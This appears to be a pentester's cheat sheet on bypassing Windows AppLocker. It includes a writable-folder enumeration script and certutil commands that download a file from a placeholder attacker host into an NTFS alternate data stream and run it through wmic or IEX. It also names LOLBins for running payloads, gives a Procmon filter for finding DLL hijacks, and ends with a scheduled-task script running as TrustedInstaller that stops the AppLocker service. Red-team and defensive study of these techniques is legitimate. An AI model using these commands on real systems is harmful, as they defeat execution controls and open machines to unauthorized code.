# Windows - Bypass AppLocker

### Overview

AppLocker is a Windows native feature, added in Windows 7 Enterprise that
replaces `SRP (Software Restriction Policies)` and allows for the restriction
and control of files users can execute.

AppLocker works in accordance with the principle of whitelisting, i.e. files
are prevented from being executed or interpreted unless they are explicitly
allowed by inclusion in whitelisting rules.

A computer can implement one or more AppLocker rules that are defined
locally (in `Local Security Policy`) or centrally via one or more `Group Policy
Object (GPO)`. The effective rules that are actually implemented on the
computer is the sum of all rules defined in Local and Group policies.

AppLocker can control the process creation for the following files type:
  - Executables: `.exe` and `.dom`
  - Scripts: `.ps1`, `.bat`, `.cmd`, `.vbs` and `.js`
  - Windows Installer: `.msi`, `.msp` and `.mst`
  - Packaged Apps: `.appx`
  - Shared Libraries and Controls: `.dll` and `.ocx `

### Extract AppLocker configuration

The effectively applied AppLocker rules can be retrieved using the
`Get-AppLockerPolicy` PowerShell cmdlet.  

An AppLocker rule is defined for an user or group, identified by the
`UserOrGroupSid` attribute, and one or more conditions, which can be a
filesystem paths, publishers for digitally signed files or files hashes.  

```
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL"

Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

### Bypass default AppLocker rules

AppLocker provides different default rules for each files type category:

  - **Executables**   
  The members of the local administrators group (SID `S-1-5-32-544`) can
  execute any binaries, while the other users can only execute binaries from
  the `%PROGRAMFILES%` and `%WINDIR%` folders.

  - **Scripts**
  Similarly, the default scripts rules allow the members of the local
  Administrators group (SID S-1-5-32-544) to execute any scripts, while the
  other users can only execute scripts from the `%PROGRAMFILES%` and `%WINDIR%`
  folders.

  - **Windows Installer**
  The default Windows Installers rules allow the members of the local
  Administrators group (SID S-1-5-32-544) to execute any Windows Installer
  files, while other users may only execute Windows Installer files that are
  digitally signed, by any authority, or from the `%WINDIR%\Installer\` folder.

  - **Packaged Apps**
  By default, any user (`Everyone`) can execute digitally signed, by any
  authority, packaged apps.

  - **Shared Libraries and Controls**
  The `Dynamic Link Libraries (DLL)` rules must be enforced through advanced
  configuration, as they can affect system performance. In a basic AppLocker
  configuration, DLL rules may not be enforced.
  If enforced, the default DLL rules work in the same fashion as the
  executables and scripts rules. The members of the local administrators group
  (SID `S-1-5-32-544`) can load any DLL, while the other users can only load
  DLLs from the `%PROGRAMFILES%` and `%WINDIR%` folders.


###### Using writable files and folders in %PROGRAMFILES% and %WINDIR% folders

While these rules may seem secure, files or folders in `%PROGRAMFILES%` and
`%WINDIR%` may be writable by non privileged users, resulting in a potential
bypass of AppLocker default rules.
Indeed, any executables and scripts placed in such folders, by non-privileged
user that would normally be restricted in their programs execution by
AppLocker, could allow for files execution against the default AppLocker rules.

The following folders in `%WINDIR%` may be writable by non privileged users on
non-hardened `Windows 10` and `Windows Server 2016` systems:  

```
# [System.Environment]::ExpandEnvironmentVariables("%WINDIR%")

%WINDIR%\System32\spool\drivers\color
%WINDIR%\tracing
%WINDIR%\Registration\CRMLog
%WINDIR%\servicing\Packages
%WINDIR%\servicing\Sessions
%WINDIR%\Tasks
%WINDIR%\Temp
%WINDIR%\System32\FxsTmp
%WINDIR%\System32\com\dmp
%WINDIR%\System32\Microsoft\Crypto\RSA\MachineKeys
%WINDIR%\System32\spool\PRINTERS
%WINDIR%\System32\spool\SERVERS
%WINDIR%\System32\Tasks\Microsoft\Windows\SyncCenter
%WINDIR%\System32\Tasks_Migrated
%WINDIR%\SysWOW64\FxsTmp
%WINDIR%\SysWOW64\com\dmp
%WINDIR%\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
%WINDIR%\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

The following PowerShell script can be used to enumerate the files and folders
writable by the `Users`, `Authenticated Users` and `Everyone` groups. It can be
run in `Constrained language` mode using
`powershell.exe -c IEX '<POWERSHELL_CODE>'` in order to bypass the default
AppLocker scripts rules.

```
Param(
[parameter(Mandatory=$false)]
[String[]] $Exclusions = @(),

[parameter(Mandatory=$false)]
[String[]] $Paths = @(
  "C:\Windows",
  "C:\Program Files",
  "C:\Program Files (x86)"
),

[parameter(Mandatory=$false)]
[String] $OutFile
)

$FSR = [System.Security.AccessControl.FileSystemRights]

$GenericRights = @{
  GENERIC_READ    = [int]0x80000000;
  GENERIC_WRITE   = [int]0x40000000;
  GENERIC_EXECUTE = [int]0x20000000;
  GENERIC_ALL     = [int]0x10000000;
  FILTER_GENERIC  = [int]0x0FFFFFFF;
}

$MappedGenericRights = @{
  FILE_GENERIC_READ    = $FSR::ReadAttributes -bor $FSR::ReadData -bor $FSR::ReadExtendedAttributes -bor $FSR::ReadPermissions -bor $FSR::Synchronize
  FILE_GENERIC_WRITE   = $FSR::AppendData -bor $FSR::WriteAttributes -bor $FSR::WriteData -bor $FSR::WriteExtendedAttributes -bor $FSR::ReadPermissions -bor $FSR::Synchronize
  FILE_GENERIC_EXECUTE = $FSR::ExecuteFile -bor $FSR::ReadPermissions -bor $FSR::ReadAttributes -bor $FSR::Synchronize
  FILE_GENERIC_ALL     = $FSR::FullControl
}

Function Map-GenericRightsToFileSystemRights([System.Security.AccessControl.FileSystemRights]$Rights) {  
  $MappedRights = New-Object -TypeName $FSR

  If ($Rights -band $GenericRights.GENERIC_EXECUTE) {
    $MappedRights = $MappedRights -bor $MappedGenericRights.FILE_GENERIC_EXECUTE
  }

  If ($Rights -band $GenericRights.GENERIC_READ) {
   $MappedRights = $MappedRights -bor $MappedGenericRights.FILE_GENERIC_READ
  }

  If ($Rights -band $GenericRights.GENERIC_WRITE) {
    $MappedRights = $MappedRights -bor $MappedGenericRights.FILE_GENERIC_WRITE
  }

  If ($Rights -band $GenericRights.GENERIC_ALL) {
    $MappedRights = $MappedRights -bor $MappedGenericRights.FILE_GENERIC_ALL
  }

  return (($Rights -band $GenericRights.FILTER_GENERIC) -bor $MappedRights) -as $FSR
}

$WriteRights = @("WriteData", "CreateFiles", "CreateDirectories", "WriteExtendedAttributes", "WriteAttributes", "Write", "ModIfy", "FullControl")

Function NotLike($String, $Patterns) {  
  ForEach ($Pattern in $Patterns) { If ($String -like $Pattern) { return $False } }
  return $True
}

function Scan($Path, $OutputFile) {
  If ($OutFile) { New-Item -Force -ItemType File -Path $OutputFile | Out-Null }
  $Cache = @()
  gci $Path -Recurse -Exclude $Exclusions -Force -ea silentlycontinue |
  ? {(NotLike $_.fullname $Exclusions)} | %{
    trap { continue }
    $File = $_.fullname
    (get-acl $File -ea silentlycontinue).access |
    ? {$_.identityreference -Match ".*USERS|EVERYONE"} | %{
      (map-genericrightstofilesystemrights $_.filesystemrights).tostring().split(",") | %{
        If ($WriteRights -Contains $_.trim()) {
		  If ($Cache -NotContains $File) {
		    Write-Host $File
		    If ($OutputFile) { $File | Out-File -Append -Force -FilePath $OutFile }
			$Cache += $File
		  }
        }
      }
    }
  }
  return $Cache
}

$Paths | %{ scan $_ $OutFile }
```

If a file is writable, NTFS `Alternate Data Streams (ADS)` can be leveraged to
bypass AppLocker without overwriting the file content, as AppLocker rules do
not prevent the execution of `ADS` streams.

```
# Executables
# type being the DOS utility, not the PowerShell Out-File alias
type <BINARY> > "<LEGITIMATE_FILE>:<ADS_STREAM>"
certutil.exe -urlcache -split -f http://<IP>:<PORT>/<FILE> "<LEGITIMATE_FILE>:<ADS_STREAM>"

wmic process call create "<LEGITIMATE_FILE>:<ADS_STREAM>"

# PowerShell scripts
type <BINARY> > "<LEGITIMATE_FILE>:<ADS_STREAM>"
certutil.exe -urlcache -split -f http://<IP>:<PORT>/<FILE> "<LEGITIMATE_FILE>:<ADS_STREAM>"
powershell.exe -c "Get-Content C:\Windows\System32\spool\drivers\color\accesschk64.exe -Stream tmp.ps1 | IEX"
```

A more comprehensive list of tools and techniques to add and execute content
for `ADS` is available on GitHub:

```
https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
```

###### Using Windows built-in binaries

If the current user does not have the necessary rights to write to any
whitelisted files or folders, default Windows built-in or .NET framework
binaries may permit to run malicious payloads. As these binaries are stored in
the %WINDIR% folder, their usage is authorized by the default AppLocker rules.

Among others, the following binaries may be leveraged to execute a custom
payload:

```
Installutil.exe
Msbuild.exe
Mshta.exe
Regasm.exe
Regsvcs.exe
Regsvr32.exe
```

Payloads using the above utilities may be generated using the Python tool
`GreatSCT`.

```
```

### Bypassing hardened AppLocker rules

###### Using DLL hijacking

If the current user does not have the necessary rights to write to any
whitelisted files or folders, and if the Windows built-in or .NET framework
binaries that permit code execution are blacklisted by specific rules, DLL
hijacking, of the DLL loaded by legitimate binaries, may allow for the bypass
of AppLocker. DLL hijacking may also be exploited against binaries that are
whitelisted, by path or file hash rules.

If the `Procmon` utility, from the `Sysinternals` suite, can be used on the
targeted system, the following filter may be used to determine if any process
may be exploitable for bypassing AppLocker using DLL hijacking:

| Column | Relation | Value | Action |
|--------|----------|-------|--------|
| Result | is | NAME NOT FOUND | Include |
| Path | ends with | dll | Include |
| Path | ends with | sys | Include |
| Path | begins with | C:\Windows | Exclude |
| Path | begins with | C:\Program | Exclude |
| Operation | begins with | Reg | Exclude |

For more information on DLL hijacking refer to the `Windows - DLL hijacking`
note.

### Bypassing AppLocker as an administrator

AppLocker is not intended to be used as a way to restrict program execution
of members of the Administrators group.
Even if an attempt to do so is made through specific AppLocker rules, members
of the Administrators group may modify the AppLocker rules, either using
`gpedit.msc` / `secpol.msc`, or by directly editing the rules, stored as files,
in the `%WINDIR%\System32\AppLocker` folder.

Additionally, members of the Administrators group have the possibility to
disable the `appidsvc` service, thus rendering AppLocker ineffective. However,
the `appidsvc` can not directly be stopped, as while being `STOPPABLE` /
`ACCEPTS_SHUTDOWN`, the service starts in `Manual (Trigger Start)` mode and
is triggered and restarted by any AppLocker event, such as the execution of a
file. The configuration of the service must thus be altered, and a restart of
the operating system is needed in order to make the change effective. As the
`appidsvc` service is protected by default by the Windows `Protected Process
Light` mechanism, the `Service Control Manager (SCM)` restricts configuration
of the service to the `TrustedInstaller` service account SID. The members of
the Administrators group have the possibility to circumvent this protection by
creating and running a schedule task that will run as the `TrustedInstaller`
service account and change the `appidsvc` start mode before stopping it. The
following code from James Forshaw can be used to do so:     

```
# sc.exe qprotection appidsvc
# SERVICE appidsvc PROTECTION LEVEL: WINDOWS LIGHT.

$a = New-ScheduledTaskAction -Execute cmd.exe -Argument "/C sc.exe config appidsvc start= demand && sc.exe stop appidsvc"
Register-ScheduledTask -TaskName 'TestTask' -TaskPath \ -Action $a
$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()
$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('TestTask')
$task.RunEx($null, 0, 0, $user)
```  
